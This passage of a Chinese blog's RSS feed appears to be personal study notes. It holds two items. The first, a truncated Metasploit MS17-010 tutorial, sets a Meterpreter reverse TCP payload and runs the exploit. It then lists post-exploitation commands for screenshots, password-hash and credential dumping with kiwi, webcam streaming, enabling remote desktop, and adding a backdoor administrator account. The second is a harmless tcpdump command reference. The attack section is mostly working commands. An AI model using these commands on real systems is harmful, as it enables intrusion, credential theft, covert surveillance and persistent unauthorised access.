&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>&lt;code>rhost&lt;/code>：设置目标主机的 IP 地址。&lt;/li>
&lt;li>&lt;code>payload&lt;/code>：设置攻击载荷，这里使用的是 &lt;code>windows/x64/meterpreter/reverse_tcp&lt;/code>，即 64 位 Windows 系统的 Meterpreter 反向 TCP 连接。&lt;/li>
&lt;li>&lt;code>lhost&lt;/code>：设置攻击机的 IP 地址，用于接收目标主机的 Meterpreter 连接。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="十开始攻击">（十）开始攻击
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">run
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">exploit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：执行攻击，利用 MS17-010 漏洞入侵目标主机。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="十一攻击生效">（十一）攻击生效
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>操作&lt;/strong>：攻击成功后，可进行以下操作：&lt;/p>
&lt;ul>
&lt;li>文件上传下载&lt;/li>
&lt;li>获取截屏&lt;/li>
&lt;li>获取密码&lt;/li>
&lt;li>开启摄像头&lt;/li>
&lt;li>后门持久化等&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="三漏洞利用">三、漏洞利用
&lt;/h2>&lt;h3 id="一截屏">（一）截屏
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">screenshot
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：通过 Meterpreter 的 &lt;code>screenshot&lt;/code> 命令获取目标主机的屏幕截图，截图保存在攻击机的 &lt;code>/home/mz/&lt;/code> 目录下。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="二获取账号密码">（二）获取账号密码
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hashdump
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">load kiwi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ps -S &lt;span class="s2">&amp;#34;csrss&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">migrate &lt;span class="o">[&lt;/span>进程号&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">creds_all
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>&lt;code>hashdump&lt;/code>：获取目标主机的用户名及加密密码。&lt;/li>
&lt;li>&lt;code>load kiwi&lt;/code>：加载 Kiwi 模块，用于获取更详细的凭证信息。&lt;/li>
&lt;li>&lt;code>ps -S &amp;quot;csrss&amp;quot;&lt;/code>：搜索 &lt;code>csrss.exe&lt;/code> 进程，获取其进程号。&lt;/li>
&lt;li>&lt;code>migrate [进程号]&lt;/code>：将 Meterpreter 迁移到指定进程，获取更高的权限（如 SYSTEM 权限）。&lt;/li>
&lt;li>&lt;code>creds_all&lt;/code>：获取目标主机的所有凭证信息，包括解析加密密码。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="三实时监控">（三）实时监控
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">run vnc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">screenshare
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>&lt;code>run vnc&lt;/code>：启动 VNC 服务，用于远程桌面监控。&lt;/li>
&lt;li>&lt;code>screenshare&lt;/code>：共享屏幕，实时查看目标主机的屏幕操作。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="四开启摄像头">（四）开启摄像头
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">webcam_stream
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：通过 Meterpreter 的 &lt;code>webcam_stream&lt;/code> 命令开启目标主机的摄像头，实时监控。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="四后渗透阶段">四、后渗透阶段
&lt;/h2>&lt;h3 id="一shell-连接目标机器">（一）Shell 连接目标机器
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：通过 Meterpreter 的 &lt;code>shell&lt;/code> 命令获取目标主机的命令行交互界面。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="二消除乱码">（二）消除乱码
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">chcp &lt;span class="m">65001&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：在目标主机上设置字符编码为 UTF-8，避免乱码问题。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="三开启目标远程桌面服务">（三）开启目标远程桌面服务
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wmic RDTOGGLE WHERE &lt;span class="nv">ServerName&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;%COMPUTERNAME%&amp;#39;&lt;/span> call SetAllowTSConnections &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：通过 Windows Management Instrumentation Command-line（WMIC）工具开启目标主机的远程桌面服务（默认端口 3389）。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="四查看端口开启状态">（四）查看端口开启状态
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netstat -an
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：查看目标主机的网络连接状态，确认远程桌面服务端口（3389）是否已开启。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="五远程桌面连接">（五）远程桌面连接
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rdesktop &lt;span class="o">[&lt;/span>目标IP&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：使用 &lt;code>rdesktop&lt;/code> 工具连接目标主机的远程桌面服务。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="六登录账号密码">（六）登录账号密码
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>操作&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>如果目标主机已有账号密码，直接使用。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果没有，可通过以下命令新建用户并提升为管理员：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>创建用户&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net user hack &lt;span class="m">123456&lt;/span> /add
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>提升为管理员&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net localgroup administrators hack /add
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="图形化建议">图形化建议
&lt;/h2>&lt;p>你可以根据上述内容绘制以下流程图：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>攻击流程图&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>内网扫描存活机器 → 确定攻击目标 → 测试目标连通性 → 打开 Kali 数据库 → 数据库初始化 → 启动 msf 工具 → 搜索漏洞 → 选择扫描模块 → 设置扫描配置 → 开始攻击 → 攻击生效。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>漏洞利用流程图&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>截屏 → 获取账号密码 → 实时监控 → 开启摄像头。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>后渗透阶段流程图&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>Shell 连接目标机器 → 消除乱码 → 开启远程桌面服务 → 查看端口状态 → 远程桌面连接 → 登录账号密码。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item><item><title>Tcpdump命令使用</title><link>https://souljian.cn/p/745241507/</link><pubDate>Mon, 21 Apr 2025 21:18:27 +0800</pubDate><guid>https://souljian.cn/p/745241507/</guid><description>&lt;p>好的，我将在笔记中补充 &lt;code>-v&lt;/code>、&lt;code>-vv&lt;/code> 和 &lt;code>-vvv&lt;/code> 的具体作用，并完善相关内容。&lt;/p>
&lt;h1 id="tcpdump-命令笔记">TCPdump 命令笔记
&lt;/h1>&lt;h2 id="一简介">一、简介
&lt;/h2>&lt;p>TCPdump 是一款强大的网络抓包工具，用于捕获和分析网络流量。它能够实时捕获网络中的数据包，并根据指定的过滤条件进行筛选和分析，是网络管理员和开发人员排查网络问题、分析网络性能的利器。&lt;/p>
&lt;h2 id="二基本语法">二、基本语法
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump &lt;span class="o">[&lt;/span>选项&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>过滤条件&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="三常用选项">三、常用选项
&lt;/h2>&lt;h3 id="31-捕获设置">3.1 捕获设置
&lt;/h3>&lt;ul>
&lt;li>&lt;code>-i &amp;lt;interface&amp;gt;&lt;/code>：指定监听的网络接口，例如&lt;code>eth0&lt;/code>、&lt;code>wlan0&lt;/code>或&lt;code>any&lt;/code>（捕获所有接口的数据包）。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>&lt;code>-c &amp;lt;count&amp;gt;&lt;/code>：捕获指定数量的数据包后停止。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -c &lt;span class="m">100&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>&lt;code>-s &amp;lt;size&amp;gt;&lt;/code>：设置捕获数据包的大小，默认为65535字节。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -s &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="32-输出设置">3.2 输出设置
&lt;/h3>&lt;ul>
&lt;li>&lt;code>-n&lt;/code>：不解析主机名和端口名，直接显示IP地址和端口号。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -n
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>&lt;code>-nn&lt;/code>：不解析主机名、端口名和协议名。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -nn
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>&lt;code>-X&lt;/code>：以十六进制和ASCII格式显示数据包内容。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -X
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>&lt;code>-v&lt;/code>、&lt;code>-vv&lt;/code>、&lt;code>-vvv&lt;/code>：增加输出的详细程度。
&lt;ul>
&lt;li>&lt;code>-v&lt;/code>：显示更多详细信息，例如协议的详细字段。&lt;/li>
&lt;li>&lt;code>-vv&lt;/code>：显示更详细的协议信息，包括一些扩展字段。&lt;/li>
&lt;li>&lt;code>-vvv&lt;/code>：显示最详细的信息，包括数据包的完整内容和协议的详细解析。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -v
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -vv
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -vvv
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="33-文件操作">3.3 文件操作
&lt;/h3>&lt;ul>
&lt;li>&lt;code>-w &amp;lt;file&amp;gt;&lt;/code>：将捕获的数据包保存到指定文件中。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -w output.pcap
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>&lt;code>-r &amp;lt;file&amp;gt;&lt;/code>：从指定文件中读取数据包。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -r output.pcap
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="四过滤条件">四、过滤条件
&lt;/h2>&lt;p>TCPdump 支持丰富的过滤条件，用于筛选特定类型的数据包。&lt;/p>
&lt;h3 id="41-基于协议过滤">4.1 基于协议过滤
&lt;/h3>&lt;ul>
&lt;li>指定协议类型，如&lt;code>tcp&lt;/code>、&lt;code>udp&lt;/code>、&lt;code>icmp&lt;/code>等。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 tcp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 udp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 icmp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="42-基于主机过滤">4.2 基于主机过滤
&lt;/h3>&lt;ul>
&lt;li>指定特定主机的IP地址。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 host 192.168.1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>指定源主机或目标主机。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 src 192.168.1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 dst 192.168.1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="43-基于端口过滤">4.3 基于端口过滤
&lt;/h3>&lt;ul>
&lt;li>指定特定端口号。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 port &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>指定源端口或目标端口。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 src port &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 dst port &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="44-复合条件">4.4 复合条件
&lt;/h3>&lt;ul>
&lt;li>使用逻辑运算符&lt;code>and&lt;/code>、&lt;code>or&lt;/code>、&lt;code>not&lt;/code>组合多个条件。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 tcp and host 192.168.1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 tcp and port &lt;span class="m">80&lt;/span> or port &lt;span class="m">443&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="五高级用法">五、高级用法
&lt;/h2>&lt;h3 id="51-捕获特定网络段">5.1 捕获特定网络段
&lt;/h3>&lt;ul>
&lt;li>指定网络段，例如捕获192.168.1.0/24网段的数据包。
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 net 192.168.1.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
